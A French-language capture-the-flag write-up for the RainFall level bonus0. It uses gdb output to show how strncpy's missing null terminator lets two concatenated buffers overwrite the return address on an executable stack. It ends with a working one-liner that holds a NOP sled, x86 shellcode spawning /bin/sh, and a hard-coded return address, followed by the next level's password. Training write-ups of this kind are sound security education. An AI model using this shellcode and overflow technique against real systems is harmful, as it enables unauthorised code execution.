Le binaire prend deux chaines de caracteres, puis les affiches.

bonus0@RainFall:~$ ./bonus0
 -
salut
 -
ca va?
salut ca va?


Dans l'assembleur on voit qu'il lit avec read:

(gdb) disass p
Dump of assembler code for function p:
		...
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   		...

Puis copie les 20 premier avec strncpy:

0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>


On test avec des "A", et un breackpoint a la fin de la fonction p:

(gdb) b * p + 104
Breakpoint 1 at 0x804851c
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

(gdb) disass
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp
   0x080484bd <+9>:	mov    0xc(%ebp),%eax
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:	mov    %eax,(%esp)
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	movb   $0x0,(%eax)
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
=> 0x0804851c <+104>:	leave
   0x0804851d <+105>:	ret
End of assembler dump.
(gdb) i r
eax            0xbffff678	-1073744264
ecx            0xb7eb9aa0	-1209296224
edx            0x41414141	1094795585
ebx            0xb7fd0ff4	-1208152076
esp            0xbfffe630	0xbfffe630
ebp            0xbffff648	0xbffff648
esi            0x0	0
edi            0x0	0
eip            0x804851c	0x804851c <p+104>
eflags         0x200287	[ CF PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/100x 0xbffff678
0xbffff678:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff688:	0x41414141	0xb7e5ec73	0x0804829c	0x00000000
0xbffff698:	0x00ca0000	0x00000001	0xb7fd0ff4	0x00000000
0xbffff6a8:	0xbffff6f8	0x080485b9	0xbffff6c6	0x080498d8
0xbffff6b8:	0x00000001	0x0804835d	0xb7fd13e4	0x0000000d
0xbffff6c8:	0x080498d8	0x080485f1	0xffffffff	0xb7e5edc6
				...

Avec l'adress de retour de strncpy on affiche s1.

Et on affiche le buffer de read:


(gdb) x/100x $ebp - 0x1008
0xbfffe640:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe650:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6c0:	0x00004141	0x00000000	0x00000000	0x00000000
0xbfffe6d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe6e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe6f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe700:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe710:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe720:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe730:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe740:	0x00000000	0x00000000	0x00000000	0x00000000



On test avec s2:



(gdb) c
Continuing.
 -
BBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 1, 0x0804851c in p ()
(gdb) x/100x $ebp - 0x1008
0xbfffe640:	0x42424242	0x42424242	0x42424242	0x42424242
0xbfffe650:	0x42424242	0x42424242	0x41410042	0x41414141
0xbfffe660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6c0:	0x00004141	0x00000000	0x00000000	0x00000000
0xbfffe6d0:	0x00000000	0x00000000	0x00000000	0x00000000
			...
(gdb) i r
eax            0xbffff68c	-1073744244
			...

(gdb) x/100x 0xbffff68c
0xbffff68c:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff69c:	0x42424242	0xb7fd0ff4	0x00000000	0xbffff6f8
0xbffff6ac:	0x080485b9	0xbffff6c6	0x080498d8	0x00000001

On affiche s2 - 10 pour voir se qu'il y a derriere:
(gdb) x/100x 0xbffff68c - 10
0xbffff682:	0x41414141	0x41414141	0x42424141	0x42424242
0xbffff692:	0x42424242	0x42424242	0x42424242	0x0ff44242
0xbffff6a2:	0x0000b7fd	0xf6f80000	0x85b9bfff	0xf6c60804
0xbffff6b2:	0x98d8bfff	0x00010804	0x835d0000	0x13e40804

On se rend compte que strncpy ne copie pas de \0 si il y en a pas.
Et que les deux chaines sont ducoup colle.

(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

En continuent on se rend compte que ducoup on a le controle d'eip.

bonus0@RainFall:~$ readelf -a bonus0 | grep "STACK"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4

On peux voir que la stack est executable.

Donc on vas mettre un shellcode dans le buffer du read et redirger eip vers notre shellcode.

On envoir des nop + notre shellcode a la premiere lecture

(gdb) r
 -
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS

Breakpoint 1, 0x0804851c in p ()
(gdb) x/100x $ebp - 0x1008
0xbfffe620:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe630:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe640:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe650:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe660:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe670:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe680:	0x4e4e4e4e	0x53535353	0x53535353	0x53535353
0xbfffe690:	0x53535353	0x53535353	0x53535353	0x53535353
0xbfffe6a0:	0x53535353	0x53535353	0x53535353	0x00000000
0xbfffe6b0:	0x00000000	0x00000000	0x00000000	0x00000000

Et a la deuxieme lecture on remplie le buffer de s2 + une adresse dans les nop pour rediriger sur le shellcode.

(gdb) c
 -
BBBBBBBBBBBBBBAAAA

Breakpoint 1, 0x0804851c in p ()
(gdb) x/100x $ebp - 0x1008
0xbfffe620:	0x42424242	0x42424242	0x42424242	0x41414242
0xbfffe630:	0x4e004141	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe640:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe650:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe660:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe670:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe680:	0x4e4e4e4e	0x53535353	0x53535353	0x53535353
0xbfffe690:	0x53535353	0x53535353	0x53535353	0x53535353
0xbfffe6a0:	0x53535353	0x53535353	0x53535353	0x00000000
(gdb) c
Continuing.
NNNNNNNNNNNNNNNNNNNNBBBBBBBBBBBBBBAAAA BBBBBBBBBBBBBBAAAA

Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()

On se rend compte qu'il y a un probleme sur notre eip.

Qui est lie au comportement de strncpy on peux lire dans le man si la taille de la source est plus petite
que la taille de len (20).
Alors strncpy remplis destination de "\0" jusque len.
Se qui explique le 0x00414141 ou 00 est un \0.
Puisqu'on envoir 18 + \n = 19. Il manque donc 1 caractere qui est remplie par strncpy avec un \0.

On ajoute donc un B pour remplire correctement le buffer avec strncpy sans ajouter de \0.

(gdb) c
BBBBBBBBBBBBBBAAAAB

Breakpoint 1, 0x0804851c in p ()
(gdb) x/100x $ebp - 0x1008
0xbfffe620:	0x42424242	0x42424242	0x42424242	0x41414242
0xbfffe630:	0x00424141	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe640:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe650:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe660:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe670:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe680:	0x4e4e4e4e	0x53535353	0x53535353	0x53535353
0xbfffe690:	0x53535353	0x53535353	0x53535353	0x53535353
0xbfffe6a0:	0x53535353	0x53535353	0x53535353	0x00000000

(gdb) c
NNNNNNNNNNNNNNNNNNNNBBBBBBBBBBBBBBAAAAB BBBBBBBBBBBBBBAAAAB

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

Voila reste a remplasser par des vrais valeur: 

bonus0@RainFall:~$ (python -c 'print ("\x90" * 300 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")' ; python -c 'print ("B" * 14 + "\x80\xe7\xff\xbf" + "B")' ; cat) | ./bonus0
 -
 -
��������������������BBBBBBBBBBBBBB����B BBBBBBBBBBBBBB����B
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
